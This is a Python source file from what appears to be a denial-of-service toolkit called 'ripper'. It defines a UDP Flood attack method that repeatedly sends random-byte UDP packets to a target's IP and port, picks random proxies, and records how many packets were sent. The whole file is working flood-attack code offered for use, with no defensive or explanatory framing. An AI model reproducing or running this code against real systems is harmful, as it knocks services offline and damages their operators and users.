from contextlib import suppress
from socket import socket
from typing import Any

from ripper.common import generate_random_bytes
from ripper.context.errors import Errors
from ripper.context.events_journal import EventsJournal
from ripper.context.target import Target
from ripper.constants import *
from ripper.actions.attack_method import AttackMethod

# Forward Reference
Context = 'Context'

Events = EventsJournal()


# TODO add support for SOCKS5 proxy if proxy supports associate request
# https://stackoverflow.com/a/47079318/2628125
# https://datatracker.ietf.org/doc/html/rfc1928
# https://blog.birost.com/a?ID=00100-38682fbb-83c3-49d7-8cfc-406b05bf086c
# PySocks has issues with basic implementation
class UdpFlood(AttackMethod):
    """UDP Flood method."""

    name: str = 'UDP Flood'
    label: str = 'udp-flood'

    _sock: socket
    _target: Target
    _ctx: Context
    _proxy: Any = None

    def __init__(self, target: Target, context: Context):
        self._target = target
        self._ctx = context

    def create_connection(self) -> socket:
        self._proxy = self._ctx.proxy_manager.get_random_proxy()
        conn = self._ctx.sock_manager.create_udp_socket()

        return conn

    def __call__(self, *args, **kwargs):
        with suppress(Exception), self.create_connection() as udp_conn:
            self._ctx.target.statistic.connect.status_success()
            Events.info('Creating new UDP connection...')
            while self.sendto(udp_conn):
                if self._ctx.dry_run:
                    break
                continue

            self._ctx.target.statistic.connect.status_failed()

    def sendto(self, sock: socket) -> bool:
        send_bytes = generate_random_bytes(
            self._ctx.random_packet_len,
            self._ctx.max_random_packet_len)
        try:
            sent = sock.sendto(send_bytes, self._target.hostip_port_tuple())
        except socket.gaierror as e:
            Events.exception(e)
            self._ctx.add_error(Errors(type(e).__name__, GETTING_SERVER_IP_ERROR_MSG))
        except Exception as e:
            Events.exception(e)
            self._ctx.add_error(Errors(type(e).__name__, e.__str__()[:128]))
        else:
            self._ctx.target.statistic.packets.status_sent(sent_bytes=sent)
            return True

        return False
